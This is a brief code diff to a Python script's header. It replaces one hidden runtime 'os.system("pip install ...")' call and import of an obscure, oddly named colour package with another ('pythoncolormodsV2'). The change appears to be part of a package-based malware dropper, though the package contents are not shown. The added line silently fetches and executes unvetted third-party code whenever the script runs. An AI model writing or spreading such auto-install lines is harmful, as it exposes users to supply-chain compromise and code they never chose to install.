@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolouringspackagesV1")
-import pythoncolouringspackagesV1
+os.system("pip install pythoncolormodsV2")
+import pythoncolormodsV2
 import random
 import requests
 import time
